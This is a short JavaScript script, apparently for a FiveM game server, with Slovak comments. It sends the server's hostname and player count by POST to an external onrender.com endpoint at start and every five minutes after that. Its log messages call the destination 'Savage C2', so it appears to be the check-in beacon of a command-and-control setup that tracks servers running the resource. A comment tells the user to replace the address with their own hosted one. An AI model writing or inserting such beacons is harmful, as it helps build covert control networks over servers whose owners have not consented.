function sendUpdate() {
    const data = {
        hostname: GetConvar("sv_hostname", "Default Server"),
        players: GetNumPlayerIndices()
    };

    // TU ZMEŇ ADRESU NA TVOJU Z RENDERU
    const url = "https://mv-menu.onrender.com/api/report"; 

    PerformHttpRequest(url, function(err, text, headers) {
        if (err === 200) {
            print("^2[Savage C2] Report odoslaný úspešne!^7");
        } else {
            print("^1[Savage C2] Chyba pri odosielaní: " + err + "^7");
        }
    }, 'POST', JSON.stringify(data), { ['Content-Type']: 'application/json' });
}

// Spustenie pri štarte a potom každých 5 minút
sendUpdate();
setInterval(sendUpdate, 300000);